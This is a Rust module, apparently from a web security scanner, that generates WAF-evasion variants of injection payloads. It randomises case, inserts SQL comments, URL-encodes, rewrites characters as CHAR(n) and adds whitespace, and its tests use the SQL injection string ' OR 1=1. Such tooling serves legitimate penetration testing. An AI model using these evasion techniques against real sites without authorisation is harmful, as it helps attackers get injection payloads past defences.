//! WAF bypass techniques - port of legacy/lib/payloads/waf_bypass.py

use rand::Rng;
use std::collections::HashSet;

/// Randomize case of letters in payload.
pub fn random_case(payload: &str) -> String {
    let mut rng = rand::thread_rng();
    payload
        .chars()
        .map(|c| {
            if c.is_alphabetic() {
                if rng.gen_bool(0.5) {
                    c.to_uppercase().next().unwrap_or(c)
                } else {
                    c.to_lowercase().next().unwrap_or(c)
                }
            } else {
                c
            }
        })
        .collect()
}

/// Add /**/ between letters of SQL keywords (SELECT -> S/**/E/**/L/**/E/**/C/**/T). All occurrences.
pub fn add_comments(payload: &str) -> String {
    let keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER BY", "GROUP BY"];
    let mut result = payload.to_string();
    for kw in &keywords {
        loop {
            let upper = result.to_uppercase();
            if let Some(pos) = upper.find(kw) {
                let before = result[..pos].to_string();
                let matched = &result[pos..pos + kw.len()];
                let rest = result[pos + kw.len()..].to_string();
                let new_mid: String = matched
                    .chars()
                    .enumerate()
                    .flat_map(|(i, c)| {
                        if i > 0 {
                            ["/**/", &c.to_string()].concat().chars().collect::<Vec<_>>()
                        } else {
                            vec![c]
                        }
                    })
                    .collect();
                result = format!("{}{}{}", before, new_mid, rest);
            } else {
                break;
            }
        }
    }
    result
}

/// URL-encode non-unreserved chars. If double, encode % as %25.
pub fn url_encode(payload: &str, double: bool) -> String {
    const UNRESERVED: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.~";
    let mut result = String::new();
    for c in payload.chars() {
        if UNRESERVED.contains(c) {
            result.push(c);
        } else {
            let hex = format!("%{:02X}", c as u32);
            let hex = if double {
                format!("%25{}", &hex[1..])
            } else {
                hex
            };
            result.push_str(&hex);
        }
    }
    result
}

/// Encode alphanumeric as CHAR(n); leave quotes and punctuation.
pub fn char_encoding(payload: &str) -> String {
    payload
        .chars()
        .map(|c| {
            if c == '\'' || c == '"' {
                c.to_string()
            } else if c.is_ascii_alphanumeric() {
                format!("CHAR({})", c as u32)
            } else {
                c.to_string()
            }
        })
        .collect()
}

const WHITESPACE: &[char] = &[' ', '\t', '\n', '\r', '\x0b', '\x0c'];
const OPERATORS: &[char] = &['=', '<', '>', '!', '+', '-', '*', '/', '(', ')', ',', ';'];

/// Add random whitespace around operators.
pub fn add_whitespace(payload: &str) -> String {
    let mut rng = rand::thread_rng();
    let mut result = String::new();
    for c in payload.chars() {
        if OPERATORS.contains(&c) {
            let w1 = WHITESPACE[rng.gen_range(0..WHITESPACE.len())];
            let w2 = WHITESPACE[rng.gen_range(0..WHITESPACE.len())];
            result.push(w1);
            result.push(c);
            result.push(w2);
        } else {
            result.push(c);
        }
    }
    result
}

/// Apply one random bypass technique.
pub fn apply_bypass_technique(payload: &str) -> String {
    let mut rng = rand::thread_rng();
    match rng.gen_range(0..5) {
        0 => random_case(payload),
        1 => add_comments(payload),
        2 => url_encode(payload, false),
        3 => char_encoding(payload),
        _ => add_whitespace(payload),
    }
}

/// Return [original, ...variants] with up to `count` variants (no duplicates). Same as Python get_bypass_payloads.
pub fn get_bypass_payloads(payload: &str, count: usize) -> Vec<String> {
    let mut out = vec![payload.to_string()];
    let mut seen: HashSet<String> = std::iter::once(payload.to_string()).collect();
    for _ in 0..count {
        let modified = apply_bypass_technique(payload);
        if seen.insert(modified.clone()) {
            out.push(modified);
        }
    }
    out
}

/// Apply WAF bypass to a list of payloads: keep originals, add variants per payload, cap at max_payloads.
/// Same as Python _apply_waf_bypass.
pub fn apply_waf_bypass(payloads: &[String], variants_per_payload: usize, max_payloads: usize) -> Vec<String> {
    let mut modified: Vec<String> = payloads.to_vec();
    for p in payloads {
        let bypass = get_bypass_payloads(p, variants_per_payload);
        for b in bypass.into_iter().skip(1) {
            modified.push(b);
        }
    }
    if modified.len() > max_payloads {
        modified.truncate(max_payloads);
    }
    modified
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_bypass_payloads_includes_original() {
        let out = get_bypass_payloads("' OR 1=1", 2);
        assert!(!out.is_empty());
        assert_eq!(out[0], "' OR 1=1");
    }

    #[test]
    fn test_random_case_changes_something() {
        let s = random_case("select");
        assert!(s.chars().any(|c| c.is_uppercase()) || s.chars().any(|c| c.is_lowercase()));
    }

    #[test]
    fn test_add_comments() {
        let s = add_comments("SELECT 1");
        assert!(s.contains("/**/"));
    }

    #[test]
    fn test_url_encode() {
        let s = url_encode("' OR 1=1", false);
        assert!(s.contains('%'));
    }

    #[test]
    fn test_apply_waf_bypass_caps_at_max() {
        let payloads: Vec<String> = (0..50).map(|i| format!("p{}", i)).collect();
        let out = apply_waf_bypass(&payloads, 3, 100);
        assert!(out.len() <= 100);
    }
}
